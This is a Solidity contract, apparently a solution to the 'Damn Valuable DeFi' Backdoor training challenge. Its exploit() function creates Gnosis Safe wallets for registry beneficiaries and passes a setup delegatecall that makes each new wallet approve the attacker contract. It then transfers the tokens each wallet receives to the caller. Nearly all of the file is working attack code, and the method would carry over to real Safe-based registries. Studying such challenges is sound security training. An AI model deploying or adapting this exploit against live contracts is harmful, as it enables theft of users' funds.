// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
import "../DamnValuableToken.sol";


contract GnosisSafeAttacker {

    address private immutable masterCopy;
    address private immutable walletFactory;
    address private immutable walletRegistry;
    DamnValuableToken private immutable token;
    
    constructor(
        address _masterCopy, 
        address _walletFactory,
        address _walletRegistry,
        address _token
    ) {
        masterCopy = _masterCopy;
        walletFactory = _walletFactory;
        walletRegistry = _walletRegistry;
        token = DamnValuableToken(_token);
    }

    // Method to approve this malicious contract to spend funds on behalf of the user
    function hijackApprove(address spender) external {
        token.approve(spender, 10 ether);
    }

    function exploit(address[] memory _beneficiaries) external {

        for (uint i=0; i<_beneficiaries.length; i++) {
            address[] memory beneficiary = new address[](1);
            beneficiary[0] = _beneficiaries[i];

            // Contruct the callData passed to WalletRegistry::proxyCreated
            bytes memory _initializer = abi.encodeWithSelector(
                // First 4 bytes need to be the setup selector
                GnosisSafe.setup.selector, 
                // List of Safe owners
                beneficiary,
                // Number of required confirmations for a Safe transaction.
                1,
                // Contract address for optional delegate call.
                address(this), 
                // Data payload for optional delegate call.
                abi.encodeWithSignature("hijackApprove(address)", address(this)),
                // Handler for fallback calls to this contract
                address(0), 
                // Token that should be used for the payment (0 is ETH)
                address(0), 
                // Value that should be paid
                0, 
                // Address that should receive the payment (or 0 if tx.origin)
                address(0) 
            );

            GnosisSafeProxy newProxy = GnosisSafeProxyFactory(walletFactory).createProxyWithCallback(
                masterCopy, 
                _initializer,
                0, 
                IProxyCreationCallback(walletRegistry)
            );

            token.transferFrom(address(newProxy), msg.sender, 10 ether);
        }
    }
}

/*
createProxyWithCallback(initalizer)
    -> createProxyWithNonce(initalizer)
        -> deployProxyWithNonce(initalizer)
            :: bytes32 salt = keccak256(abi.encodePacked(keccak256(initializer), saltNonce));
        -> Execute call to the new proxy contract, with initializer payload (delegatecall)
            :: Proxy contract executes a delegatecall to implementation contract (with initializer payload)
    -> Execute proxyCreated() on callback address
*/